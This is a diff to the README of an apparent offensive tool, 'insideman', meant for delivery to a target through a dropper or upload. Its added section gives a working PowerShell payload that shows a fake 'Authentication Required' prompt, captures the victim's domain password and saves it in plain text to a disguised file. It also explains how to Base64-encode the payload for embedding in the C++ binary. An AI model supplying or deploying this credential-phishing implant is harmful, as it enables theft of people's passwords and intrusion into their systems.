@@ -4,6 +4,22 @@ USAGE:
 
 Use gcc to compile the cpp file. gcc.exe insideman.cpp -o insideman.exe
 
-Attach to a dropper file with iExpress or upload to target. 
+Attach to a dropper with iExpress or upload to target. 
 
-Use beacon to cat out C:\Users\$user\Documents\windows32.txt for plaintext password.
+Plaintext password is stored at C:\Users\$user\Documents\windows32.txt on the target machine.
+
+ROLL YOUR OWN:
+
+1). Open Powershell and copy the command below (Change text/output path as needed for specific pretexts):
+
+$str= '$sessionCredential = $host.ui.PromptForCredential("Authentication Required", "Please Enter Your Domain Username and Password:", "$env:UserDomain\$env:USERNAME", ""); $mpass = [System.Net.NetworkCredential]::new("",$sessionCredential.password).Password; $user = $env:USERNAME; $mpass > C:\\Users\user\Documents\windows32.txt'
+
+2.) Translate To Base64
+
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+
+3.) Paste Base64 Output to Base64 String In InsideMan.cpp
+
+4.) Compile 
+
+gcc.exe insideman.cpp -o insideman.exe
